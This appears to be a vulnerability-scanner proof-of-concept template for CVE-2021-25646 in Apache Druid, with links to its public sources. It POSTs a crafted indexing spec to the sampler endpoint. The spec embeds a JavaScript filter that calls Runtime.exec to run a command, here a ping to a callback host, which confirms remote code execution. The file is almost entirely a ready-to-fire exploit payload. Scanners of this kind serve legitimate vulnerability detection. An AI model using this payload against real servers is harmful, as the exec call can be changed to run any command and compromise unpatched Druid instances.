name: poc-yaml-druid-cve-2021-25646.yml
set:
  reverse: newReverse()
  reverseIP: reverse.ip
rules:
  - method: POST
    path: /druid/indexer/v1/sampler
    headers:
      Content-Type: application/json;charset=UTF-8
    body: {"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec('ping {{reverseIP}} -c 4')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
    expression: |
      response.status == 200 && reverse.wait(5)
detail:
  author: en0th
  links: 
    - https://twitter.com/_0xf4n9x_/status/1356625706407653379
    - https://twitter.com/wugeej/status/1357509755544080386
    - https://gist.github.com/FanqXu/36c5e0070fd8e0b6646993b4e386a6b1
